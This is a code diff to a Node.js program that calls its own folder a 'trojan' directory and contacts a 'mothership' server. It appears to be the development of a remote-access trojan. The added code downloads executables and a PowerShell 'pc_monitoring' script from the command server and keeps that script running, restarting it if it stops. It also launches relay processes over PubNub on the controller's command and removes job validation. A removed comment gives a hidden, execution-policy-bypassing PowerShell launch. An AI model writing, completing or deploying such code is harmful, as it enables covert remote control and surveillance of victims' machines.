@@ -232,7 +232,7 @@ var systemstate = {
         return path.join(this.trojandir, "python");
     },
 
-    get pythonpath() {
+    get pythonexepath() {
         // path to python exe
         // TODO
     },
@@ -2138,8 +2138,8 @@ function runbatrelay(pubnubo) {
     return child;
 }
 
-function launchrelay(tenginename, tpubnubr) {
-    logmsg(`launching: ${tenginename}, ${tpubnubr}`);
+function launchrelay(tenginename, tpubnubr, browsername) {
+    logmsg(`launching: ${tenginename}, ${tpubnubr}, ${browsername}`);
 
     if (tenginename == "JS") {
         tchildp = runnoderelay(tpubnubr);
@@ -2148,8 +2148,7 @@ function launchrelay(tenginename, tpubnubr) {
     } else if (tenginename == "PS1") {
         tchildp = runpsrelay(tpubnubr);
     } else if (tenginename == "PY") {
-        // TODO: get browsername from args
-        tchildp = runpythonrelay(tpubnubr, "chrome");
+        tchildp = runpythonrelay(tpubnubr, browsername);
     } else if (tenginename == "VBS") {
         tchildp = runvbsrelay(tpubnubr);
     }
@@ -2184,18 +2183,11 @@ function relay() {
 
     logmsg("clientjob: " + JSON.stringify(clientjob));
 
-    let jobtype = clientjob?.jobtype;
-    let cmdname = clientjob?.cmdname;
+    // let jobtype = clientjob?.jobtype; // not used -- should be EXEC_CMD
+    // let cmdname = clientjob?.cmdname; // not used -- should be StartRelay
     let args = clientjob?.args;
     let enginename = (args ?? [])[0];
-
-    if (jobtype != "EXEC_CMD") {
-        throw new Error("jobtype must be EXEC_CMD");
-    }
-
-    if (cmdname != "StartRelay") {
-        throw new Error("cmdname must be StartRelay");
-    }
+    let browsername = enginename == 'PY' && args?.length > 1 ? args[1] : null;
 
     if (isNullOrWhitespace(enginename)) {
         throw new Error("cmdname must be StartRelay");
@@ -2228,7 +2220,7 @@ function relay() {
         let tcmdpid = childp?.pid ?? -1;
 
         if (!isPidAlive(tcmdpid)) {
-            childp = launchrelay(enginename, pubnubr);
+            childp = launchrelay(enginename, pubnubr, browsername);
         }
     };
 
@@ -2355,6 +2347,8 @@ async function retrieveClientJob() {
 function cmdlist_handlecmdjob(clientjob, configfpath) {
     logmsg("starting");
 
+    let cmdlistcmd = systemstate.cmdconfig;
+    
     let cmdname = clientjob.cmdname.toLowerCase();
 
     if (!CmdConfig.isCmdExist(cmdname)) {
@@ -2372,13 +2366,13 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
         stopcmd = true;
     }
 
-    let jobcmd = cmdlistcmd.getChildCmd(cmdname);
-
-    if ( ! jobcmd ) {
-        throw new Error(`could not create child cmd {cmdname}`);
-    }
-
     if ( stopcmd ) {
+
+        let jobcmd = cmdlistcmd.getChildCmd(cmdname);
+
+        if ( ! jobcmd ) {
+            throw new Error(`child cmd {cmdname} no in child cmd list`);
+        }
 
         jobcmd.processMessage = (msg) => {
             logmsg(JSON.stringify(msg));
@@ -2387,6 +2381,12 @@ function cmdlist_handlecmdjob(clientjob, configfpath) {
         cmdlistcmd.sendMessage(jobcmd, "cmdlist", clientjob);
 
     } else if ( ! stopcmd ) {
+
+        let jobcmd = cmdlistcmd.newCmdConfig(cmdname); // anchor
+
+        if ( ! jobcmd ) {
+            throw new Error(`could not create child cmd {cmdname}`);
+        }
 
         jobcmd.processMessage = (msg) => {
             logmsg(JSON.stringify(msg));
@@ -2434,14 +2434,13 @@ async function cmdlist_handleMessage(msg) {
         throw new Error("clientjobconfigpath does note exist " + configfpath);
     }
 
-    if ( jobtype == 'EXEC_CMD' )  {
+    if ( jobtype.toLowerCase() == 'EXEC_CMD'.toLowerCase() )  {
         await cmdlist_handlecmdjob(clientjob, configfpath);
-        logmsg("finished");
         return;
     }
 
-    // validate clientjob before proceeding
-
+    // TODO: validate clientjob object before launching command
+    
     let execjobcmd = cmdlistcmd.newCmdConfig("execjob");
 
     if ( ! execjobcmd ) {
@@ -3032,33 +3031,32 @@ async function download_python() {
     }
 }
 
-// TODO: populate with list of assets to retrieve
 async function retrieve() {
     logmsg("starting");
 
-    // pc_monitoring.ps1, nircmdc.exe, 7za.exe, gunite.exe
-    let scriptname = "pythonrelay.py";
-    let baseUrl = systemstate.mothershipassets + "/" + scriptname;
-    let params = null; // systemstate.statekvp;
+    let assets = ["pythonrelay.py", "pc_monitoring.ps1", "nircmdc.exe", "7za.exe", "gunite.exe" ];
+    
+    for ( let i = 0; i<assets.length; i++ ) {
+        let fname = assets[i];
+        let baseUrl = systemstate.mothershipassets + "/" + fname;
 
-    let localpath = path.join(systemstate.trojandir, scriptname);
+        let localpath = path.join(systemstate.trojandir, fname);
 
-    let downloadOpts = {
-        download: true,
-        filetype: "txt",
-        localpath: localpath,
-    };
+        let downloadOpts = {
+            download: true,
+            filetype: "bin",
+            localpath: localpath,
+        };
 
-    let response = await makeGetRequest(baseUrl, params, null, downloadOpts);
+        let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
 
-    // logmsg("response: " + JSON.stringify(response));
+        if (!fileExists(localpath)) {
+            throw new Error("retrieve failed for: " + localpath);
+        }
 
-    if (!fileExists(localpath)) {
-        throw new Error("retrieve failed for: " + localpath);
+        const stats = fs.statSync(localpath);
+        console.log(`${localpath} -- File size: ${stats.size} bytes`);
     }
-
-    const stats = fs.statSync(localpath);
-    console.log(`${localpath} -- File size: ${stats.size} bytes`);
 
     process.exit(0);
     logmsg("finished");
@@ -3111,16 +3109,17 @@ async function download_pspcmon() {
     return { state:true };
 }
 
-// TODO // anchor
 async function pspcmon() {
 
     logmsg('starting');
 
     let pspcmoncmd = systemstate.cmdconfig;
 
-    let ret = await download_pspcmon();
-
     let scriptfpath = path.join(systemstate.pspcmondir, 'pc_monitoring.ps1');
+
+    if ( ! fileExists(scriptfpath) ) {
+        await download_pspcmon();
+    }
 
     if ( ! fileExists(scriptfpath) ) {
         throw new Error('pspcmon script does not exist '+scriptfpath);
@@ -3137,10 +3136,9 @@ async function pspcmon() {
 
         logmsg("received new client job: " + JSON.stringify(clientjob));
 
-        if ( clientjob?.cmdname == 'StopPSPCMon' ) {
+        if ( clientjob?.cmdname.toLowerCase() == 'StopPSPCMon'.toLowerCase() ) {
             killswitch = true;
         }
-        // TODO: listen for msg from cmdlist for "StopPSPCMon"
     };
 
     let childp = null;
@@ -3163,17 +3161,10 @@ async function pspcmon() {
         if ( (! killswitch) && (!isPidAlive(tcmdpid)) ) {
             childp = execPSScript(scriptfpath);
         }
+
     };
 
     pspcmoncmd.loop();
-    // invoke_exe -- launch powershell using conhost 
-    // monitor child process, if inactive restart
-    // conhost.exe --headless powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File pc_monitoring.ps1
-
-    // let pspcmon = grab cmd obj
-
-    // setup loop function
-
 
     logmsg('finished');
 }
